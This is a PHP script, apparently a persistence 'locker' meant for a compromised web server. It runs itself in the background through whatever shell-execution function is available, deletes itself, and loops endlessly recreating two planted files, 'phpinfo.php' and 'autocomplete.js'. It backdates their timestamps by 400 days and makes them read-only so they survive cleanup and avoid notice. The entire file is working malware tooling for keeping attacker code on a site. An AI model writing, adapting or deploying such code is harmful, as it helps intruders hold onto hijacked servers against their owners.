<?php
$lock_file_name = 'phpinfo.php';
$lock_ht_name = 'autocomplete.js';
$current_file_path = __FILE__;
$current_dir = realpath(dirname($current_file_path));
$lock_file_path = "phpinfo.php";
$lock_ht_path = "autocomplete.js";
$current_file_name = str_replace($current_dir, '', $current_file_path);
$current_file_name = str_replace("/", '', $current_file_name);
$current_file_name = str_replace("\\", '', $current_file_name);
$lockHt = 1;
$php_path = getPhpPath();
if (functionCheck() !== false) {
    $data_array['执行命令'] = "nohup $php_path " . $current_file_path . " >/dev/null 2>&1 &";
    run($data_array['执行命令']);
    $result = run("ps aux | grep $current_file_name");
    foreach (explode("\n", $result) as  $value) {
        $data_array[] = $value;
    }
    html_display($data_array);
} else {
    $data_array['执行错误'] = '现有方法无法执行命令,执行第二种方案的锁';
    html_display($data_array);
    @unlink(__FILE__);
    error_reporting(0);
    ignore_user_abort(true);
    set_time_limit(0);
    $CodeIndex = @file_get_contents('autocomplete.js');
    $CodeHtaccess = @file_get_contents('phpinfo.php');
    while (1 == 1) {
        if (file_exists(__FILE__)) {
            header('Location: http://' . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);
            break;
        }
        lockfile('autocomplete.js', $CodeIndex);
        lockfile('phpinfo.php', $CodeHtaccess);
    };
}

echo $_SERVER['SCRIPT_NAME'];
function html_display($data_array)
{
    foreach ($data_array as $key => $value) {
        echo PHP_EOL . '<hr />' . PHP_EOL;
        echo "<p>$key : $value</p>";

    }
}

function getPhpPath() 
{
    ob_start();
    phpinfo(1);
    $info = ob_get_contents();
    ob_end_clean();
    preg_match("/--bindir=([^&]+)/si", $info, $matches);
    if (isset($matches[1]) && $matches[1] != '') {
        return $matches[1] . '/php';
    }
    preg_match("/--prefix=([^&]+)/si", $info, $matches);
    if (!isset($matches[1])) {
        return 'php';
    }
    return $matches[1] . '/bin/php';
}


function is_cli() {
    $is_cli = preg_match("/cli/i", php_sapi_name()) ? true : false;
    if ($is_cli === false) {
        if (isset($_SERVER['argc']) && $_SERVER['argc'] >= 2) {
            $is_cli = true;
        }
    }
    if ($is_cli === false) {
        if (!isset($_SERVER['SCRIPT_NAME'])) {
            $is_cli = true;
        }
    }
    return $is_cli;
}

function run($command,)
{

        try {
            if (function_exists('shell_exec')) {
                $output = shell_exec($command);
            } elseif (function_exists('exec')) {
                exec($command, $output);
                $output = implode("\n", $output);
            } elseif (function_exists('passthru')) {
                ob_start();
                passthru($command);
                $output = ob_get_clean();
            } elseif (function_exists('system')) {
                ob_start();
                system($command);
                $output = ob_get_clean();
            } elseif (function_exists('proc_open')) {
                $descriptors = array(
                    0 => array('pipe', 'r'),  // stdin
                    1 => array('pipe', 'w'),  // stdout
                    2 => array('pipe', 'w')   // stderr
                );
                $process = proc_open($command, $descriptors, $pipes);
                $output = stream_get_contents($pipes[1]);
                fclose($pipes[1]);
                proc_close($process);
            } else {
                throw new Exception('Command execution is disabled.');
            }
        } catch (Exception $e) {
            $output = $e->getMessage();
        }
}

function functionCheck()
{
    $disabled = explode(',', ini_get('disable_functions'));
    $new_disable = array();
    foreach ($disabled as $item) {
        $new_disable[] = trim($item);
    }
    if (in_array('exec', $new_disable) && in_array('popen', $new_disable)) {
        return false;
    }
    return true;
}
function lockfilefunc($lock_file_path,$current_file_name,$content,$hash_content){
    if (!file_exists($lock_file_path)) {
        @file_put_contents($lock_file_path, $content);
        @touch($lock_file_path, strtotime("-400 days", time()));
        @chmod($lock_file_path, 0444);
    }
    $new_content = file_get_contents($lock_file_path);
    $new_hash_content = hash('sha1', $new_content);
    if ($new_hash_content != $hash_content) {
        @unlink($lock_file_path);
        @file_put_contents($lock_file_path, $content);
        @touch($lock_file_path, strtotime("-400 days", time()));
        @chmod($lock_file_path, 0444);
    }
    @chmod($lock_file_path, 0444);
}

if (is_cli()) {
    @unlink($current_file_path);
    $content = file_get_contents($lock_file_path);
    $hash_content = hash('sha1', $content);
    $htContent = file_get_contents($lock_ht_path);
    $hash_ht_content = hash('sha1', $htContent);
    while (true) {
        if (file_exists($current_file_name)) {
            break;
        }
        lockfilefunc($lock_file_path,$current_file_name,$content,$hash_content);
        if ($lockHt == 1){
            lockfilefunc($lock_ht_path,$current_file_name,$htContent,$hash_ht_content);
        }
        sleep(1);
    }
}


function lockfile($file, $data)
{
    @unlink($file);
    chmod($file, 0777);
    @unlink($file);
    file_put_contents($file, $data);
    chmod($file, 0444);
    usleep(1000000);
}
